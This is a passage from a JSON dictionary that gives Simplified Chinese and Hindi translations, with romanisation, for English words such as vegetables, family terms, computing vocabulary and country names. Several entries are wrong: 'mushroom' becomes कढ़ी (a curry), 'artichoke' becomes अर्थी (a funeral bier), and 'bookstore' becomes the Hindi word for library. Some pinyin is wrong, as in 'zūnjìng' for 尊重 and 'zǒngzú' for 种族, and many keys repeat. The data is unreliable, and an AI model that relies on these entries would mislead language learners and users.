            "onion": {
                "Chinese (Simplified)": "洋葱 (yáng cōng)",
                "Hindi": "प्याज (pyāj)"
            },
            "tomato": {
                "Chinese (Simplified)": "番茄 (fān qié)",
                "Hindi": "टमाटर (ṭamāṭar)"
            },
            "spinach": {
                "Chinese (Simplified)": "菠菜 (bō cài)",
                "Hindi": "पालक (pālak)"
            },
            "cucumber": {
                "Chinese (Simplified)": "黄瓜 (huáng guā)",
                "Hindi": "खीरा (khīrā)"
            },
            "cauliflower": {
                "Chinese (Simplified)": "菜花 (cài huā)",
                "Hindi": "गोभी (gōbhī)"
            },
            "broccoli": {
                "Chinese (Simplified)": "西兰花 (xī lán huā)",
                "Hindi": "ब्रोकोली (brokōlī)"
            },
            "beans": {
                "Chinese (Simplified)": "豆类 (dòu lèi)",
                "Hindi": "फली (phalī)"
            },
            "peas": {
                "Chinese (Simplified)": "豌豆 (wān dòu)",
                "Hindi": "मटर (maṭar)"
            },
            "pumpkin": {
                "Chinese (Simplified)": "南瓜 (nán guā)",
                "Hindi": "कद्दू (kaḍdū)"
            },
            "eggplant": {
                "Chinese (Simplified)": "茄子 (qié zi)",
                "Hindi": "बैंगन (baingan)"
            },
            "sweet potato": {
                "Chinese (Simplified)": "甘薯 (gān shǔ)",
                "Hindi": "शकरकंदी (śakarakandī)"
            },
            "lettuce": {
                "Chinese (Simplified)": "生菜 (shēng cài)",
                "Hindi": "सलाद पत्ता (salād pattā)"
            },
            "radish": {
                "Chinese (Simplified)": "萝卜 (luó bo)",
                "Hindi": "मूली (mūlī)"
            },
            "bell pepper": {
                "Chinese (Simplified)": "甜椒 (tián jiāo)",
                "Hindi": "शिमला मिर्च (shimlā mirch)"
            },
            "zucchini": {
                "Chinese (Simplified)": "西葫芦 (xī hú lú)",
                "Hindi": "लौकी (lauki)"
            },
            "asparagus": {
                "Chinese (Simplified)": "芦笋 (lú sǔn)",
                "Hindi": "शतावरी (śatāvarī)"
            },
            "mushroom": {
                "Chinese (Simplified)": "蘑菇 (mó gū)",
                "Hindi": "कढ़ी (kaṛhī)"
            },
            "cabbage": {
                "Chinese (Simplified)": "卷心菜 (juǎn xīn cài)",
                "Hindi": "पत्तागोभी (pattāgōbhī)"
            },
            "leek": {
                "Chinese (Simplified)": "韭菜 (jiǔ cài)",
                "Hindi": "हिरा प्याज (hirā pyāj)"
            },
            "artichoke": {
                "Chinese (Simplified)": "朝鲜蓟 (zhāo xiǎn jì)",
                "Hindi": "अर्थी (arthī)"
            },
            "celery": {
                "Chinese (Simplified)": "芹菜 (qín cài)",
                "Hindi": "शलरी (shalrī)"
            },
            "corn": {
                "Chinese (Simplified)": "玉米 (yù mǐ)",
                "Hindi": "मकई (makai)"
            },
            "chili": {
                "Chinese (Simplified)": "辣椒 (là jiāo)",
                "Hindi": "मिर्च (mirch)"
            },
            "ginger": {
                "Chinese (Simplified)": "姜 (jiāng)",
                "Hindi": "अदरक (adarak)"
            },
            "life": {
                "Hindi": "जीवन (jīvan)",
                "Chinese (Simplified)": "生命 (shēngmìng)"
            },
            "affect": {
                "Hindi": "प्रभावित करना (prabhāvit karnā)",
                "Chinese (Simplified)": "影响 (yǐngxiǎng)"
            },
            "effect": {
                "Hindi": "प्रभाव (prabhāv)",
                "Chinese (Simplified)": "效果 (xiàoguǒ)"
            },
            "peek": {
                "Hindi": "झाँकना (jhāṅknā)",
                "Chinese (Simplified)": "偷看 (tōukàn)"
            },
            "seen": {
                "Hindi": "देखा (dekha)",
                "Chinese (Simplified)": "看到 (kàndào)"
            },
            "pick": {
                "Hindi": "चुनना (cunnā)",
                "Chinese (Simplified)": "挑选 (tiāoxuǎn)"
            },
            "shave": {
                "Hindi": "दाढ़ी बनाना (dāṛhī banānā)",
                "Chinese (Simplified)": "刮胡子 (guāhúzi)"
            },
            "global": {
                "Hindi": "वैश्विक (vaišvik)",
                "Chinese (Simplified)": "全球的 (quánqiú de)"
            },
            "illegal": {
                "Hindi": "अवैध (avaidh)",
                "Chinese (Simplified)": "非法的 (fēifǎ de)"
            },
            "legal": {
                "Hindi": "कानूनी (kānūnī)",
                "Chinese (Simplified)": "合法的 (héfǎ de)"
            },
            "myths": {
                "Hindi": "मिथक (mithak)",
                "Chinese (Simplified)": "神话 (shénhuà)"
            },
            "myth": {
                "Hindi": "मिथक (mithak)",
                "Chinese (Simplified)": "神话 (shénhuà)"
            },
            "stereotypes": {
                "Hindi": "रूढ़ियाँ (rūṛhiyāṅ)",
                "Chinese (Simplified)": "刻板印象 (kèbǎn yìnxiàng)"
            },
            "message": {
                "Hindi": "संदेश (sandēś)",
                "Chinese (Simplified)": "消息 (xiāoxi)"
            },
            "about": {
                "Hindi": "के बारे में (ke bāre meṃ)",
                "Chinese (Simplified)": "关于 (guānyú)"
            },
            "expect": {
                "Hindi": "उम्मीद करना (ummīd karnā)",
                "Chinese (Simplified)": "期待 (qīdài)"
            },
            "past": {
                "Hindi": "बीता हुआ (bītā huā)",
                "Chinese (Simplified)": "过去的 (guòqù de)"
            },
            "present": {
                "Hindi": "वर्तमान (vartman)",
                "Chinese (Simplified)": "现在 (xiànzài)"
            },
            "future": {
                "Hindi": "भविष्य (bhaviṣya)",
                "Chinese (Simplified)": "未来 (wèilái)"
            },
            "rise": {
                "Hindi": "उदय (uday)",
                "Chinese (Simplified)": "上升 (shàngshēng)"
            },
            "fall": {
                "Hindi": "गिरना (girnā)",
                "Chinese (Simplified)": "下降 (xiàjiàng)"
            },
            "strategy": {
                "Hindi": "रणनीति (raṇanīti)",
                "Chinese (Simplified)": "战略 (zhànlüè)"
            },
            "proof": {
                "Hindi": "प्रमाण (pramāṇa)",
                "Chinese (Simplified)": "证据 (zhèngjù)"
            },
            "respect": {
                "Hindi": "सम्मान (sammān)",
                "Chinese (Simplified)": "尊重 (zūnjìng)"
            },
            "call": {
                "Hindi": "कॉल करना (kāl karnā)",
                "Chinese (Simplified)": "打电话 (dǎ diànhuà)"
            },
            "available": {
                "Hindi": "उपलब्ध (upalabdh)",
                "Chinese (Simplified)": "可用的 (kěyòng de)"
            },
            "banner": {
                "Hindi": "बैनर (bainar)",
                "Chinese (Simplified)": "横幅 (héngfú)"
            },
            "morning": {
                "Chinese (Simplified)": "早晨 (zǎo chén)",
                "Hindi": "सुबह (subah)"
            },
            "evening": {
                "Chinese (Simplified)": "晚上 (wǎn shàng)",
                "Hindi": "शाम (shaam)"
            },
            "love you": {
                "Chinese (Simplified)": "我爱你 (wǒ ài nǐ)",
                "Hindi": "मैं तुमसे प्यार करता हूँ (main tumse pyaar karta hoon)"
            },
            "where": {
                "Chinese (Simplified)": "哪里 (nǎ lǐ)",
                "Hindi": "कहाँ (kahaan)"
            },
            "good": {
                "Chinese (Simplified)": "好 (hǎo)",
                "Hindi": "अच्छा (accha)"
            },
            "bad": {
                "Chinese (Simplified)": "坏 (huài)",
                "Hindi": "बुरा (bura)"
            },
            "time": {
                "Chinese (Simplified)": "时间 (shí jiān)",
                "Hindi": "समय (samay)"
            },
            "day": {
                "Chinese (Simplified)": "天 (tiān)",
                "Hindi": "दिन (din)"
            },
            "night": {
                "Chinese (Simplified)": "夜晚 (yè wǎn)",
                "Hindi": "रात (raat)"
            },
            "happy": {
                "Chinese (Simplified)": "快乐 (kuài lè)",
                "Hindi": "खुश (khush)"
            },
            "sad": {
                "Chinese (Simplified)": "悲伤 (bēi shāng)",
                "Hindi": "उदास (udaas)"
            },
            "help": {
                "Chinese (Simplified)": "帮助 (bāng zhù)",
                "Hindi": "मदद (madad)"
            },
            "father": {
                "Chinese (Simplified)": "父亲 (fù qīn)",
                "Hindi": "पिता (pita)"
            },
            "mother": {
                "Chinese (Simplified)": "母亲 (mǔ qīn)",
                "Hindi": "माँ (maa)"
            },
            "brother": {
                "Chinese (Simplified)": "兄弟 (xiōng dì)",
                "Hindi": "भाई (bhai)"
            },
            "sister": {
                "Chinese (Simplified)": "姐妹 (jiě mèi)",
                "Hindi": "बहन (behen)"
            },
            "son": {
                "Chinese (Simplified)": "儿子 (ér zi)",
                "Hindi": "पुत्र/बेटा (putra)"
            },
            "daughter": {
                "Chinese (Simplified)": "女儿 (nǚ ér)",
                "Hindi": "बेटी (beti)"
            },
            "friend": {
                "Chinese (Simplified)": "朋友 (péng yǒu)",
                "Hindi": "मित्र/दोस्त (dost)"
            },
            "house": {
                "Chinese (Simplified)": "房子 (fáng zi)",
                "Hindi": "घर (ghar)"
            },
            "school": {
                "Chinese (Simplified)": "学校 (xué xiào)",
                "Hindi": "स्कूल (school)"
            },
            "book": {
                "Chinese (Simplified)": "书 (shū)",
                "Hindi": "किताब (kitaab)"
            },
            "pen": {
                "Chinese (Simplified)": "钢笔 (gāng bǐ)",
                "Hindi": "कलम (kalam)"
            },
            "phone": {
                "Chinese (Simplified)": "电话 (diàn huà)",
                "Hindi": "फोन (phone)"
            },
            "computer": {
                "Chinese (Simplified)": "电脑 (diànnǎo)",
                "Hindi": "कंप्यूटर (kampyūṭar)"
            },
            "internet": {
                "Chinese (Simplified)": "互联网 (hùliánwǎng)",
                "Hindi": "इंटरनेट (intarnet)"
            },
            "keyboard": {
                "Chinese (Simplified)": "键盘 (jiànpán)",
                "Hindi": "कीबोर्ड (kībōrḍ)"
            },
            "monitor": {
                "Chinese (Simplified)": "显示器 (xiǎnshìqì)",
                "Hindi": "मॉनिटर (mōniṭar)"
            },
            "mouse": {
                "Chinese (Simplified)": "鼠标 (shǔbiāo)",
                "Hindi": "माउस (māus)"
            },
            "software": {
                "Chinese (Simplified)": "软件 (ruǎnjiàn)",
                "Hindi": "सॉफ़्टवेयर (sāfṭaveyar)"
            },
            "hardware": {
                "Chinese (Simplified)": "硬件 (yìngjiàn)",
                "Hindi": "हार्डवेयर (hārdaveyar)"
            },
            "processor": {
                "Chinese (Simplified)": "处理器 (chǔlǐqì)",
                "Hindi": "प्रोसेसर (prosesar)"
            },
            "database": {
                "Chinese (Simplified)": "数据库 (shùjùkù)",
                "Hindi": "डेटाबेस (ḍeṭābes)"
            },
            "network": {
                "Chinese (Simplified)": "网络 (wǎngluò)",
                "Hindi": "नेटवर्क (neṭavark)"
            },
            "file": {
                "Chinese (Simplified)": "文件 (wénjiàn)",
                "Hindi": "फाइल (phāil)"
            },
            "application": {
                "Chinese (Simplified)": "应用 (yìngyòng)",
                "Hindi": "एप्लिकेशन (epalikēśan)"
            },
            "program": {
                "Chinese (Simplified)": "程序 (chéngxù)",
                "Hindi": "प्रोग्राम (prōgrām)"
            },
            "code": {
                "Chinese (Simplified)": "代码 (dàimǎ)",
                "Hindi": "कोड (koḍ)"
            },
            "password": {
                "Chinese (Simplified)": "密码 (mìmǎ)",
                "Hindi": "पासवर्ड (pāsvard)"
            },
            "server": {
                "Chinese (Simplified)": "服务器 (fúwùqì)",
                "Hindi": "सर्वर (sarvar)"
            },
            "cloud": {
                "Chinese (Simplified)": "云 (yún)",
                "Hindi": "क्लाउड (klāuḍ)"
            },
            "virtual": {
                "Chinese (Simplified)": "虚拟 (xūnǐ)",
                "Hindi": "वर्चुअल (varchuval)"
            },
            "router": {
                "Chinese (Simplified)": "路由器 (lùyóuqì)",
                "Hindi": "राउटर (rāuṭar)"
            },
            "firewall": {
                "Chinese (Simplified)": "防火墙 (fánghuǒqiáng)",
                "Hindi": "फ़ायरवॉल (phāyarvāl)"
            },
            "encryption": {
                "Chinese (Simplified)": "加密 (jiāmì)",
                "Hindi": "एन्क्रिप्शन (enkripeśan)"
            },
            "algorithm": {
                "Chinese (Simplified)": "算法 (suànfǎ)",
                "Hindi": "एल्गोरिदम (elgōridam)"
            },
            "data": {
                "Chinese (Simplified)": "数据 (shùjù)",
                "Hindi": "डेटा (ḍeṭā)"
            },
            "binary": {
                "Chinese (Simplified)": "二进制 (èrjìnzhì)",
                "Hindi": "बाइनरी (bāinari)"
            },
            "compile": {
                "Chinese (Simplified)": "编译 (biānyì)",
                "Hindi": "कम्पाइल (kampāil)"
            },
            "debug": {
                "Chinese (Simplified)": "调试 (tiáoshì)",
                "Hindi": "डीबग (ḍībaga)"
            },
            "syntax": {
                "Chinese (Simplified)": "语法 (yǔfǎ)",
                "Hindi": "सिंटैक्स (siṇṭaiks)"
            },
            "framework": {
                "Chinese (Simplified)": "框架 (kuàngjià)",
                "Hindi": "फ्रेमवर्क (phremavark)"
            },
            "rain": {
                "Chinese (Simplified)": "雨 (yǔ)",
                "Hindi": "बारिश (baarish)"
            },
            "sun": {
                "Chinese (Simplified)": "太阳 (tài yáng)",
                "Hindi": "सूरज (sooraj)"
            },
            "moon": {
                "Chinese (Simplified)": "月亮 (yuè liàng)",
                "Hindi": "चाँद (chaand)"
            },
            "hot": {
                "Chinese (Simplified)": "热 (rè)",
                "Hindi": "गर्म (garm)"
            },
            "cold": {
                "Chinese (Simplified)": "冷 (lěng)",
                "Hindi": "ठंडा (thanda)"
            },
            "big": {
                "Chinese (Simplified)": "大 (dà)",
                "Hindi": "बड़ा (bada)"
            },
            "work": {
                "Chinese (Simplified)": "工作 (gōng zuò)",
                "Hindi": "काम (kaam)"
            },
            "world": {
                "Chinese (Simplified)": "世界 (shì jiè)" ,
                "Hindi": "दुनिया (duniya)"
            },
            "thank you": {
                "Chinese (Simplified)": "谢谢 (xiè xiè)" ,
                "Hindi": "धन्यवाद (dhanyavaad)"
            },
            "good morning": {
                "Chinese (Simplified)": "早上好 (zǎo shang hǎo)" ,
                "Hindi": "सुप्रभात (shubh prabhat) "
            },
            "today": {
                "Chinese (Simplified)": "今天 (jīn tiān)",
                "Hindi": "आज (aaj)"
            },
            "yes": {
                "Chinese (Simplified)": "是的 (shì de)" ,
                "Hindi": "हाँ (haan)"
            },
            "no": {
                "Chinese (Simplified)": "不是 (bù)",
                "Hindi": "नहीं (nahin)"
            },
            "please": {
                "Chinese (Simplified)": "请 (qing)",
                "Hindi": "कृपया (kripya)"
            },
            "sorry": {
                "Chinese (Simplified)": "对不起 (duì bu qǐ)",
                "Hindi": "माफ़ कीजिए (maaf kijiye)"
            },
            "friend": {
                "Chinese (Simplified)": "朋友 (péng yǒu)",
                "Hindi": "दोस्त (dost)"
            },
            "love": {
                "Chinese (Simplified)": "爱 (ài)",
                "Hindi": "प्यार (pyar)"
            },
            "goodbye": {
                "Chinese (Simplified)": "再见 (zài jiàn)",
                "Hindi": "अलविदा (alvida)"
            },
            "please": {
                "Chinese (Simplified)": "请 (qǐng)",
                "Hindi": "कृपया (kripya)"
            },
            "sorry": {
                "Chinese (Simplified)": "对不起 (duì bù qǐ)",
                "Hindi": "माफ़ करना (maaf karna)"
            },
            "good": {
                "Chinese (Simplified)": "好 (hǎo)",
                "Hindi": "अच्छा (acchā)"
            },
            "bad": {
                "Chinese (Simplified)": "坏 (huài)",
                "Hindi": "बुरा (burā)"
            },
            "big": {
                "Chinese (Simplified)": "大 (dà)",
                "Hindi": "बड़ा (baṛā)"
            },
            "small": {
                "Chinese (Simplified)": "小 (xiǎo)",
                "Hindi": "छोटा (choṭā)"
            },
            "fast": {
                "Chinese (Simplified)": "快 (kuài)",
                "Hindi": "तेज़ (tez)"
            },
            "slow": {
                "Chinese (Simplified)": "慢 (màn)",
                "Hindi": "धीमा (dhīma)"
            },
            "hot": {
                "Chinese (Simplified)": "热 (rè)",
                "Hindi": "गर्म (garm)"
            },
            "cold": {
                "Chinese (Simplified)": "冷 (lěng)",
                "Hindi": "ठंडा (ṭhaṇḍā)"
            },
            "water": {
                "Chinese (Simplified)": "水 (shuǐ)",
                "Hindi": "पानी (pānī)"
            },
            "food": {
                "Chinese (Simplified)": "食物 (shí wù)",
                "Hindi": "खाना (khānā)"
            },
            "constitution": {
                "Hindi": "संविधान (saṃvidhān)",
                "Chinese (Simplified)": "宪法 (xiànfǎ)"
            },
            "bring": {
                "Hindi": "लाना (lānā)",
                "Chinese (Simplified)": "带来 (dài lái)"
            },
            "worst": {
                "Hindi": "सबसे बुरा (sabse burā)",
                "Chinese (Simplified)": "最坏的 (zuì huài de)"
            },
            "extent": {
                "Hindi": "सीमा (sīmā)",
                "Chinese (Simplified)": "程度 (chéngdù)"
            },
            "suicide": {
                "Hindi": "आत्महत्या (ātmahatyā)",
                "Chinese (Simplified)": "自杀 (zìshā)"
            },
            "card": {
                "Hindi": "कार्ड (kārd)",
                "Chinese (Simplified)": "卡片 (kǎpiàn)"
            },
            "under": {
                "Hindi": "नीचे (nīce)",
                "Chinese (Simplified)": "在...下面 (zài...xiàmian)"
            },
            "cover": {
                "Hindi": "ढकना (ḍhaknā)",
                "Chinese (Simplified)": "覆盖 (fùgài)"
            },
            "killer": {
                "Hindi": "हत्यारा (hatyarā)",
                "Chinese (Simplified)": "杀手 (shāshǒu)"
            },
            "assassin": {
                "Hindi": "हत्यारा (hatyarā)",
                "Chinese (Simplified)": "刺客 (cìkè)"
            },
            "celebrate": {
                "Hindi": "मनाना (manānā)",
                "Chinese (Simplified)": "庆祝 (qìngzhù)"
            },
            "using": {
                "Hindi": "इस्तेमाल करके (istēmāl karke)",
                "Chinese (Simplified)": "使用 (shǐyòng)"
            },
            "open": {
                "Hindi": "खोलना (kholnā)",
                "Chinese (Simplified)": "打开 (dǎkāi)"
            },
            "close": {
                "Hindi": "बंद करना (band karnā)",
                "Chinese (Simplified)": "关闭 (guānbì)"
            },
            "will": {
                "Hindi": "इच्छाशक्ति (icchāśakti)",
                "Chinese (Simplified)": "意志 (yìzhì)"
            },
            "fit": {
                "Hindi": "फिट होना (fit honā)",
                "Chinese (Simplified)": "适合 (shìhé)"
            },
            "fill": {
                "Hindi": "भरना (bharna)",
                "Chinese (Simplified)": "填满 (tiánmǎn)"
            },
            "chaos": {
                "Hindi": "अव्यवस्था (avyavasthā)",
                "Chinese (Simplified)": "混乱 (hùnluàn)"
            },
            "explain": {
                "Hindi": "समझाना (samajhānā)",
                "Chinese (Simplified)": "解释 (jiěshì)"
            },
            "response": {
                "Hindi": "प्रतिक्रिया (pratikriyā)",
                "Chinese (Simplified)": "回应 (huíyìng)"
            },
            "respond": {
                "Hindi": "जवाब देना (javāb denā)",
                "Chinese (Simplified)": "回应 (huíyìng)"
            },
            "figure": {
                "Hindi": "आकृति (ākṛti)",
                "Chinese (Simplified)": "数字 (shùzì)"
            },
            "insane": {
                "Hindi": "पागल (pāgal)",
                "Chinese (Simplified)": "疯狂的 (fēngkuáng de)"
            },
            "bomb": {
                "Hindi": "बम (bam)",
                "Chinese (Simplified)": "炸弹 (zhàdàn)"
            },
            "blast": {
                "Hindi": "विस्फोट (visphot)",
                "Chinese (Simplified)": "爆炸 (bàozhà)"
            },
            "emotional": {
                "Hindi": "भावनात्मक (bhāvnātmak)",
                "Chinese (Simplified)": "情感的 (qínggǎn de)"
            },
            "damage": {
                "Hindi": "नुकसान (nuksān)",
                "Chinese (Simplified)": "损害 (sǔnhài)"
            },
            "build": {
                "Hindi": "बनाना (banānā)",
                "Chinese (Simplified)": "建造 (jiànzào)"
            },
            "control": {
                "Hindi": "नियंत्रण (niyantṛaṇ)",
                "Chinese (Simplified)": "控制 (kòngzhì)"
            },
            "debt": {
                "Hindi": "ऋण (ṛṇa)",
                "Chinese (Simplified)": "债务 (zhàiwù)"
            },
            "theory": {
                "Hindi": "सिद्धांत (siddhānt)",
                "Chinese (Simplified)": "理论 (lǐlùn)"
            },
            "invasion": {
                "Hindi": "आक्रमण (ākramṇa)",
                "Chinese (Simplified)": "入侵 (rùqīn)"
            },
            "civilization": {
                "Hindi": "सभ्यता (sabhyatā)",
                "Chinese (Simplified)": "文明 (wénmíng)"
            },
            "between": {
                "Hindi": "के बीच (ke bīc)",
                "Chinese (Simplified)": "之间 (zhījiān)"
            },
            "race": {
                "Hindi": "दौड़ (dauṛ)",
                "Chinese (Simplified)": "种族 (zǒngzú)"
            },
            "racism": {
                "Hindi": "नस्लवाद (naslavād)",
                "Chinese (Simplified)": "种族歧视 (zǒngzú qíshì)"
            },
            "recognize": {
                "Hindi": "पहचानना (pahcānna)",
                "Chinese (Simplified)": "认出 (rènchū)"
            },
            "react": {
                "Hindi": "प्रतिक्रिया करना (pratikriyā karnā)",
                "Chinese (Simplified)": "反应 (fǎnyìng)"
            },
            "reaction": {
                "Hindi": "प्रतिक्रिया (pratikriyā)",
                "Chinese (Simplified)": "反应 (fǎnyìng)"
            },
            "without": {
                "Hindi": "बिना (binā)",
                "Chinese (Simplified)": "没有 (méiyǒu)"
            },
            "keys": {
                "Hindi": "चाबियाँ (cābiyāṅ)",
                "Chinese (Simplified)": "钥匙 (yàoshi)"
            },
            "key": {
                "Hindi": "चाभी (cābhī)",
                "Chinese (Simplified)": "钥匙 (yàoshi)"
            },
            "solution": {
                "Hindi": "समाधान (samādhān)",
                "Chinese (Simplified)": "解决方案 (jiějué fāngàn)"
            },
            "trash": {
                "Hindi": "कचरा (kacrā)",
                "Chinese (Simplified)": "垃圾 (lājī)"
            },
            "everything": {
                "Hindi": "सब कुछ (sab kuch)",
                "Chinese (Simplified)": "一切 (yīqiè)"
            },
            "every": {
                "Hindi": "हर (har)",
                "Chinese (Simplified)": "每个 (měigè)"
            },
            "consistent": {
                "Hindi": "संगत (sangat)",
                "Chinese (Simplified)": "一致的 (yīzhì de)"
            },
            "final": {
                "Hindi": "अंतिम (antim)",
                "Chinese (Simplified)": "最后的 (zuìhòu de)"
            },
            "overtake": {
                "Hindi": "पछाड़ना (pachāṛnā)",
                "Chinese (Simplified)": "超越 (chāoyue)"
            },
            "legacy": {
                "Hindi": "विरासत (virāsat)",
                "Chinese (Simplified)": "遗产 (yíchǎn)"
            },
            "legends": {
                "Hindi": "किंवदंतियाँ (kinvandanṭiyāँ)",
                "Chinese (Simplified)": "传说 (chuánshuō)"
            },
            "die": {
                "Hindi": "मरना (marnā)",
                "Chinese (Simplified)": "死亡 (sǐwáng)"
            },
            "never": {
                "Hindi": "कभी नहीं (kabhī nahī̃)",
                "Chinese (Simplified)": "从来没有 (cóng méiyǒu)"
            },
            "legend": {
                "Hindi": "किंवदंती (kinvandanṭī)",
                "Chinese (Simplified)": "传奇 (chuánqí)"
            },
            "beginner": {
                "Hindi": "शुरुआत करने वाला (śurūāt karne vāla)",
                "Chinese (Simplified)": "初学者 (chūxuézhě)"
            },
            "medicine": {
                "Chinese (Simplified)": "药 (yào)",
                "Hindi": "दवा (davā)"
            },
            "student": {
                "Chinese (Simplified)": "学生 (xué shēng)",
                "Hindi": "विद्यार्थी (vidyārthī)"
            },
            "library": {
                "Chinese (Simplified)": "图书馆 (tú shū guǎn)",
                "Hindi": "पुस्तकालय (pustakālay)"
            },
            "office": {
                "Chinese (Simplified)": "办公室 (bàn gōng shì)",
                "Hindi": "कार्यालय (kāryālaya)"
            },
            "market": {
                "Chinese (Simplified)": "市场 (shì chǎng)",
                "Hindi": "बाज़ार (bāzār)"
            },
            "phone": {
                "Chinese (Simplified)": "电话 (diàn huà)",
                "Hindi": "फोन (phon)"
            },
            "computer": {
                "Chinese (Simplified)": "电脑 (diàn nǎo)",
                "Hindi": "कंप्यूटर (kampyūṭar)"
            },
            "internet": {
                "Chinese (Simplified)": "互联网 (hù lián wǎng)",
                "Hindi": "इंटरनेट (inṭarneṭ)"
            },
            "book": {
                "Chinese (Simplified)": "书 (shū)",
                "Hindi": "किताब (kitāb)"
            },
            "pen": {
                "Chinese (Simplified)": "钢笔 (gāng bǐ)",
                "Hindi": "कलम (kalam)"
            },
            "paper": {
                "Chinese (Simplified)": "纸 (zhǐ)",
                "Hindi": "कागज (kāgaz)"
            },
            "bag": {
                "Chinese (Simplified)": "包 (bāo)",
                "Hindi": "बैग (baig)"
            },
            "clothes": {
                "Chinese (Simplified)": "衣服 (yī fú)",
                "Hindi": "कपड़े (kapṛe)"
            },
            "shoes": {
                "Chinese (Simplified)": "鞋子 (xié zi)",
                "Hindi": "जूते (jūte)"
            },
            "sky": {
                "Chinese (Simplified)": "天空 (tiān kōng)",
                "Hindi": "आकाश (aakaash)"
            },
            "river": {
                "Chinese (Simplified)": "河流 (hé liú)",
                "Hindi": "नदी (nadi)"
            },
            "mountain": {
                "Chinese (Simplified)": "山 (shān)",
                "Hindi": "पहाड़ (pahaad)"
            },
            "nepal": {
                "Chinese (Simplified)": "尼泊尔 (Níbó'ěr)",
                "Hindi": "नेपाल (Nepāl)"
            },
            "sri Lanka": {
                "Chinese (Simplified)": "斯里兰卡 (Sīlǐlánkǎ)",
                "Hindi": "श्रीलंका (Shrīlāṅkā)"
            },
            "taiwan": {
                "Chinese (Simplified)": "台湾 (Táiwān)",
                "Hindi": "ताइवान (Tāiwān)"
            },
            "bangladesh": {
                "Chinese (Simplified)": "孟加拉国 (Mèngjiālāguó)",
                "Hindi": "बांगलादेश (Bāṅglādēś)"
            },
            "iran": {
                "Chinese (Simplified)": "伊朗 (Yīlǎng)",
                "Hindi": "ईरान (Īrān)"
            },
            "tree": {
                "Chinese (Simplified)": "树 (shù)",
                "Hindi": "पेड़ (ped)"
            },
            "welcome": {
                "Chinese (Simplified)": "欢迎 (huān yíng)",
                "Hindi": "स्वागत है (swāgat hai)"
            },
            "flower": {
                "Chinese (Simplified)": "花 (huā)",
                "Hindi": "फूल (phool)"
            },
            "road": {
                "Chinese (Simplified)": "路 (lù)",
                "Hindi": "सड़क (sadak)"
            },
            "city": {
                "Chinese (Simplified)": "城市 (chéng shì)",
                "Hindi": "शहर (shahar)"
            },
            "village": {
                "Chinese (Simplified)": "村庄 (cūn zhuāng)",
                "Hindi": "गांव (gaon)"
            },
            "ocean": {
                "Chinese (Simplified)": "海洋 (hǎi yáng)",
                "Hindi": "समुद्र (samudra)"
            },
            "child": {
                "Chinese (Simplified)": "孩子 (hái zi)",
                "Hindi": "बच्चा (bachcha)"
            },
            "star": {
                "Chinese (Simplified)": "星星 (xīng xīng)",
                "Hindi": "तारा (taara)"
            },
            "chair": {
                "Chinese (Simplified)": "椅子 (yǐ zi)",
                "Hindi": "कुर्सी (kursi)"
            },
            "please wait": {
                "Chinese (Simplified)": "请等一下 (qǐng děng yī xià)",
                "Hindi": "कृपया इंतजार करें (kripya intezaar karein)"
            },
            "how much": {
                "Chinese (Simplified)": "多少钱 (duō shǎo qián)",
                "Hindi": "कितना (kitna)"
            },
            "stop": {
                "Chinese (Simplified)": "停 (tíng)",
                "Hindi": "रोकें (roken)"
            },
            "start": {
                "Chinese (Simplified)": "开始 (kāi shǐ)",
                "Hindi": "शुरू करें (shuru karein)"
            },
            "danger": {
                "Chinese (Simplified)": "危险 (wēi xiǎn)",
                "Hindi": "खतरा (khatra)"
            },
            "help me": {
                "Chinese (Simplified)": "帮助我 (bāng zhù wǒ)",
                "Hindi": "मदद करें (madad karein)"
            },
            "fire": {
                "Chinese (Simplified)": "火 (huǒ)",
                "Hindi": "आग (aag)"
            },
            "water bottle": {
                "Chinese (Simplified)": "水瓶 (shuǐ píng)",
                "Hindi": "पानी की बोतल (paani ki botal)"
            },
            "food delivery": {
                "Chinese (Simplified)": "送餐 (sòng cān)",
                "Hindi": "खाना डिलीवरी (khana delivery)"
            },
            "coffee": {
                "Chinese (Simplified)": "咖啡 (kā fēi)",
                "Hindi": "कॉफ़ी (coffee)"
            },
            "music": {
                "Chinese (Simplified)": "音乐 (yīn yuè)",
                "Hindi": "संगीत (sangeet)"
            },
            "movie": {
                "Chinese (Simplified)": "电影 (diàn yǐng)",
                "Hindi": "फिल्म (film)"
            },
            "bookstore": {
                "Chinese (Simplified)": "书店 (shū diàn)",
                "Hindi": "पुस्तकालय (pustakalaya)"
            },
            "celebrate": {
                "Chinese (Simplified)": "庆祝 (qìng zhù)",
                "Hindi": "जश्न मनाना (jashn manāna)"
            },
            "journey": {
                "Chinese (Simplified)": "旅程 (lǚ chéng)",
                "Hindi": "यात्रा (yātrā)"
            },
            "adventure": {
                "Chinese (Simplified)": "冒险 (mào xiǎn)",
                "Hindi": "साहसिक यात्रा (sāhasik yātrā)"
            },
            "freedom": {
                "Chinese (Simplified)": "自由 (zì yóu)",
                "Hindi": "स्वतंत्रता (svatantrtā)"
            },
            "success": {
                "Chinese (Simplified)": "成功 (chéng gōng)",
                "Hindi": "सफलता (safaltā)"
            },
            "unity": {
                "Chinese (Simplified)": "团结 (tuán jié)",
                "Hindi": "एकता (ektā)"
            },
            "explore": {
                "Chinese (Simplified)": "探索 (tàn suǒ)",
                "Hindi": "अन्वेषण (anvēṣaṇ)"
            },
            "innovate": {
                "Chinese (Simplified)": "创新 (chuàng xīn)",
                "Hindi": "नवोन्मेष (navonmeṣ)"
            },
            "enlightenment": {
                "Chinese (Simplified)": "启蒙 (qǐ méng)",
                "Hindi": "प्रकाश (prakāś)"
            },
            "passion": {
                "Chinese (Simplified)": "激情 (jī qíng)",
                "Hindi": "उत्साह (utsāh)"
            },
            "knowledgeable": {
                "Chinese (Simplified)": "博学 (bó xué)",
                "Hindi": "ज्ञानी (jñānī)"
            },
            "resilience": {
                "Chinese (Simplified)": "韧性 (rèn xìng)",
                "Hindi": "लचीलापन (lachīlāpan)"
            },
            "achievement": {
                "Chinese (Simplified)": "成就 (chéng jiù)",
                "Hindi": "उपलब्धि (uplabdhī)"
            },
            "purpose": {
                "Chinese (Simplified)": "目的 (mù dì)",
                "Hindi": "उद्देश्य (uddeśya)"
            },
            "fruit": {
                "Hindi": "फल (phal)",
                "Chinese (Simplified)": "水果 (shuǐguǒ)"
            },
            "bread": {
                "Hindi": "रोटी (roṭī)",
                "Chinese (Simplified)": "面包 (miànbāo)"
            },
            "tea": {
                "Hindi": "चाय (chāy)",
                "Chinese (Simplified)": "茶 (chá)"
            },
            "see": {
                "Hindi": "देखना (dekhna)",
                "Chinese (Simplified)": "看 (kàn)"
            },
            "speak": {
                "Hindi": "बोलना (bolnā)",
                "Chinese (Simplified)": "说 (shuō)"
            },
            "kid": {
